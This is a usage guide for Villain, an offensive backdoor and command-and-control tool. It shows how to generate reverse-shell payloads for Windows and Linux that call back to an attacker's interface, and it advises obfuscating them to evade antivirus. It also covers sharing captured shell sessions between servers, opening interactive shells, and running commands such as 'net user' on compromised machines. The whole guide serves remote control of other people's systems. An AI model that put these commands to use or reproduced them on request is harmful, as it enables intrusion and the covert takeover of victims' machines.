# Usage Guide
:warning: Villain was explicitly developed and tested on **kali linux**.  
:warning: This guide is a work in progress currently describing key features. Check out Villain's introduction on youtube for more info.

## Table of contents
1. [Generate Backdoor Payloads](Generate-Reverse-Shell-Commands)
2. [Connect With Sibling Server](Connect-With-Sibling-Server)
3. [The shell Command](The-shell-Command)
4. [The exec Command](The-exec-Command)

## Generate Reverse Shell Commands
Use the `generate` prompt command to generate payloads for Windows / Linux machines. 
In the latest Villain release, this function was redesigned to use payload templates (files). In `Core/payload_templates/<OS>/<HANDLER>/` you can find these templates, edit them, make your own, etc. Ultimately, you should replace the predefined Windows reverse shell commands with obfuscated versions. That way you can create a personalized instance of Villain and deal with AV evasion in a more productive and efficient way. Here's how 📽️ -> [youtube.com/watch?v=grSBdZdUya0](https://www.youtube.com/watch?v=grSBdZdUya0)  

Main logic:
```
generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
```

Usage examples:
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
generate payload=linux/hoaxshell/sh_curl lhost=eth0
```

- The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. 
- For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
- To catch HoaxShell https-based reverse shells you need to start Villain with SSL.

⚡TCP socket based shells (netcat) are more stable and reliable than HoaxShell.
⚠️HoaxShell payloads are not reusable (will work only once). I will probably change that in the future.

Use the prompt commands `backdoors` and `sessions` to list info about your active shell sessions.

## Connect With Sibling Server
Use the `connect` prompt command to connect and share your shell sessions with another machine running Villain. 
```
connect <IP> <TEAM SERVER PORT>
```
By default, the Core server port is `65001` (you can change that with `-p` when starting Villain).

## The shell Command
Use the `shell` prompt command to start an interactive HoaxShell against a session. 
```
shell <SESSION ID or ALIAS>
```
Press Ctrl + C or type `exit` to return to the main Villain prompt.

## The exec Command
Use the `exec` prompt command to execute a **quoted command** or **script from your file system** against a session. 
```
exec </path/to/local/file> <SESSION ID or ALIAS>
exec 'net user;Get-Date' <SESSION ID or ALIAS>
```
